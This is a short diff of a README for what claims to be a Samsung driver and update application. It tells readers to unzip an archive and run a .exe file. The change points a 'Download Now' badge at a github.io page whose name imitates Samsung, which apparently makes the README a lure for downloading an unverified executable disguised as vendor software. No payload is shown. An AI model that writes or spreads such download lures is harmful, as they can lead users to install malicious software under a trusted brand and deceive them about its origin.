@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://samsung-update-settings.github.io/.github/)
 
 ## 📸 Overview
 <img width="1196" height="870" alt="samsung-update-driver-updates" src="https://github.com/user-attachments/assets/89dba9c7-e94d-480a-9328-f20bf0abe57f" />
